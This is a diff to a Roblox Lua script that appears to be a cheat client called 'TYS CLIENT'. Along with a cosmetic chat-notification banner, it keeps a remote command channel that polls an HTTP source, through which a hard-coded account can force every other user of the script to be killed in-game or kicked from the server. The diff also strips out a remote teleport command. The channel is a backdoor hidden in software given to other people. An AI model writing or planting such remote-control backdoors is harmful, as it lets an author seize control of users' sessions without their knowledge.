@@ -2615,6 +2615,71 @@ do
     sendCorner.Parent = ChatUI.SendBtn
 end
 
+-- ==============================================================================
+-- ВЕРХНИЙ БАННЕР ДЛЯ СКРЫТОГО ЧАТА TYS CLIENT
+-- ==============================================================================
+local TopChatBanner = Instance.new("Frame")
+TopChatBanner.Name = "TopChatBanner"
+TopChatBanner.Size = UDim2.new(0, 420, 0, 44)
+TopChatBanner.Position = UDim2.new(0.5, -210, 0, -70) -- Спрятан за верхней границей
+TopChatBanner.BackgroundColor3 = Color3.fromRGB(22, 10, 38)
+TopChatBanner.BackgroundTransparency = 0.15
+TopChatBanner.BorderColor3 = Color3.fromRGB(170, 60, 255)
+TopChatBanner.BorderSizePixel = 1
+TopChatBanner.ZIndex = 500
+TopChatBanner.Parent = ScreenGui
+
+local TopBannerCorner = Instance.new("UICorner")
+TopBannerCorner.CornerRadius = UDim.new(0, 8)
+TopBannerCorner.Parent = TopChatBanner
+
+local TopBannerStroke = Instance.new("UIStroke")
+TopBannerStroke.Color = Color3.fromRGB(200, 80, 255)
+TopBannerStroke.Thickness = 1.2
+TopBannerStroke.Parent = TopChatBanner
+
+local TopChatText = Instance.new("TextLabel")
+TopChatText.Size = UDim2.new(1, -20, 1, 0)
+TopChatText.Position = UDim2.new(0, 10, 0, 0)
+TopChatText.BackgroundTransparency = 1
+TopChatText.ZIndex = 501
+TopChatText.Font = Enum.Font.GothamMedium
+TopChatText.TextSize = 11
+TopChatText.TextColor3 = Color3.fromRGB(255, 255, 255)
+TopChatText.TextWrapped = true
+TopChatText.RichText = true
+TopChatText.Text = ""
+TopChatText.Parent = TopChatBanner
+
+local topChatThread = nil
+local function showTopNotification(senderName: string, text: string, isLocal: boolean)
+    if topChatThread then
+        task.cancel(topChatThread)
+        topChatThread = nil
+    end
+
+    local tagColor = isLocal and "#df99ff" or "#85e0ff"
+    TopChatText.Text = string.format("💬 <font color='%s'><b>%s:</b></font> <font color='#ffffff'>%s</font>", tagColor, senderName, text)
+
+    topChatThread = task.spawn(function()
+        -- Выезд сверху вниз
+        local tweenIn = TweenService:Create(TopChatBanner, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+            Position = UDim2.new(0.5, -210, 0, 15)
+        })
+        tweenIn:Play()
+        tweenIn.Completed:Wait()
+
+        -- Задержка отображения (3.5 секунды)
+        task.wait(3.5)
+
+        -- Плавный уход обратно наверх
+        local tweenOut = TweenService:Create(TopChatBanner, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {
+            Position = UDim2.new(0.5, -210, 0, -70)
+        })
+        tweenOut:Play()
+    end)
+end
+
 local function addChatMessage(senderName: string, text: string, isLocal: boolean)
     do
         local row = Instance.new("Frame")
@@ -2656,6 +2721,9 @@ local function addChatMessage(senderName: string, text: string, isLocal: boolean
     task.defer(function()
         ChatUI.Scrolling.CanvasPosition = Vector2.new(0, 999999)
     end)
+
+    -- Показ сообщения сверху экрана
+    showTopNotification(senderName, text, isLocal)
 
     if not isLocal and typeof(playSound) == "function" then
         pcall(playSound, "rbxassetid://6518811702", 0.25, 1.4)
@@ -3087,30 +3155,16 @@ local lastCmdId = ""
 local sessionStartTime = os.time()
 local ADMIN_NAME = "ABUGEZAN"
 
-local function runAdminAction(cmdData: any, issuer: string)
+local function runAdminAction(action: string, issuer: string)
     if LocalPlayer.Name == ADMIN_NAME or LocalPlayer.DisplayName == ADMIN_NAME then
         return
     end
 
-    local action = (type(cmdData) == "table") and cmdData.action or cmdData
     local char = LocalPlayer.Character
     local hum = char and char:FindFirstChildOfClass("Humanoid")
     local root = char and char:FindFirstChild("HumanoidRootPart")
 
-    if action == "bring" and type(cmdData) == "table" and cmdData.targetPos then
-        if root then
-            pcall(function()
-                root.AssemblyLinearVelocity = Vector3.zero
-                root.AssemblyAngularVelocity = Vector3.zero
-            end)
-            local dest = Vector3.new(cmdData.targetPos.X, cmdData.targetPos.Y, cmdData.targetPos.Z)
-            if char:IsA("Model") then
-                char:PivotTo(CFrame.new(dest))
-            else
-                root.CFrame = CFrame.new(dest)
-            end
-        end
-    elseif action == "kill" then
+    if action == "kill" then
         if hum then hum.Health = 0 end
     elseif action == "kick" then
         LocalPlayer:Kick("ты был выкинут с сервера админ панелью абугезана")
@@ -3222,7 +3276,7 @@ if httpRequest then
                     local cmdTime = tonumber(cmdData.timestamp) or 0
                     if cmdData.cmdId ~= lastCmdId and cmdTime >= sessionStartTime then
                         lastCmdId = cmdData.cmdId
-                        runAdminAction(cmdData, cmdData.issuer or "Admin")
+                        runAdminAction(cmdData.action, cmdData.issuer or "Admin")
                     end
                 end
             end
